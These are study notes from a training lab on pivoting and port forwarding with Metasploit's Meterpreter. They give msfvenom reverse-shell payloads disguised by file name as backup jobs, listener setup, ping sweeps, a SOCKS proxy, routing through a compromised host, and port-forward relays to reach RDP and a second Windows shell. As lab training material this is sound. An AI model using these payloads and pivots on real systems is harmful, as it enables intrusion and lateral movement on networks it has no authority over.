# Pivoting, Tunneling, and Port Forwarding — Meterpreter Tunneling & Port Forwarding

**Module:** HTB Academy – Pivoting, Tunneling, and Port Forwarding

---

## Overview

- Alternative to **SSH-based** pivoting: do everything through a **Meterpreter session** on the pivot host instead.
- Scenario: Meterpreter shell on the Ubuntu pivot → want to enumerate/scan the internal `172.16.5.0/23` network and reach the Windows target, all via Meterpreter's own tooling.

---

## Step 1 — Get a Meterpreter Session on the Pivot

### Generate Payload

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

### Start Listener

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

### Deploy & Execute on Pivot (via SSH)

```bash
chmod +x backupjob
./backupjob
```

### Confirm Session

```
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826)
meterpreter > pwd
/home/ubuntu
```

## Step 2 — Ping Sweep the Internal Network

### Via Meterpreter Post Module

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

### Manual For-Loop Alternatives (run directly on a pivot host)

**Linux:**
```bash
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

**Windows CMD:**
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**PowerShell:**
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

**Note:** A ping sweep may fail on the first pass while the host builds its ARP cache — **retry at least twice**. If a target firewall blocks ICMP, fall back to a TCP scan instead.

## Step 3 — Metasploit SOCKS Proxy (Alternative to SSH `-D`)

Instead of SSH dynamic forwarding, Metasploit can run its own SOCKS proxy routed through the Meterpreter session.

### Configure `socks_proxy`

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
msf6 auxiliary(server/socks_proxy) > jobs      # confirm it's running
```

### Update Proxychains Config

`/etc/proxychains.conf`:
```
socks4  127.0.0.1 9050
```
(Switch to `socks5` in the config if the proxy is running as SOCKS5.)

### Add Routes with AutoRoute

**Via module:**
```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

**Via Meterpreter directly:**
```
meterpreter > run autoroute -s 172.16.5.0/23
```

**List active routes:**
```
meterpreter > run autoroute -p
```
```
Subnet          Netmask         Gateway
10.129.0.0      255.255.0.0     Session 1
172.16.4.0      255.255.254.0   Session 1
172.16.5.0      255.255.254.0   Session 1
```

### Test the Proxy + Routing

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
# Discovered open port 3389/tcp on 172.16.5.19
```

## Step 4 — Meterpreter `portfwd` (Local Forward)

Meterpreter has its own port-forwarding module — no SSH needed.

```
meterpreter > help portfwd
```

| Flag | Meaning |
|---|---|
| `-l` | Forward: local port to listen on. Reverse: local port to connect to |
| `-L` | Forward: local host to listen on (optional). Reverse: local host to connect to |
| `-p` | Forward: remote port to connect to. Reverse: remote port to listen on |
| `-r` | Forward: remote host to connect to |
| `-R` | Indicates a reverse port forward |

### Create a Local TCP Relay (e.g., to RDP)

```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

- Attack host's local port `3300` → forwarded via Meterpreter → `172.16.5.19:3389`.

### Connect

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### Verify with Netstat

```bash
netstat -antp
# tcp 127.0.0.1:54652 127.0.0.1:3300 ESTABLISHED xfreerdp
```
- Defensive note: Netstat is useful for spotting established sessions if a host is suspected compromised.

## Step 5 — Meterpreter Reverse Port Forwarding

Use case: listen on a port on the **compromised pivot**, forward any incoming shell connections there back to the **attack host**.

### Create the Reverse Forward Rule

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
# Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

- Connections to the pivot's port `1234` → relayed to attack host `10.10.14.18:8081`.

### Background the Session & Start a New Listener

```
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > run
```

### Generate the Windows Payload (callback → pivot's IP)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

- `LHOST` = the **pivot's** internal IP (reachable by the Windows target) — same principle as SSH `-R` pivoting.

### Execute on Windows → Resulting Session

```
[*] Started reverse TCP handler on 0.0.0.0:8081
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173)

meterpreter > shell
C:\>
```

## Key Takeaways

| Capability | Mechanism |
|---|---|
| Ping sweep | `post/multi/gather/ping_sweep`, or manual for-loops (Linux/CMD/PowerShell) |
| SOCKS proxy (no SSH needed) | `auxiliary/server/socks_proxy` + proxychains |
| Add routes to reach new subnets | `post/multi/manage/autoroute` or `run autoroute -s <subnet>` |
| Local port forward | `portfwd add -l <local> -p <remote> -r <remote_host>` |
| Reverse port forward | `portfwd add -R -l <attack_host_port> -p <pivot_listen_port> -L <attack_host_ip>` |

- Meterpreter can fully replace SSH for pivoting once you have a session on the pivot: **socks_proxy** ≈ SSH `-D`, **portfwd** ≈ SSH `-L`/`-R`.
- Always point generated payloads' `LHOST` at whichever host the **target can actually reach** — the pivot's internal IP for reverse shells originating beyond the pivot.
- `autoroute -p` is the quick way to confirm which subnets are currently routed through a given session.
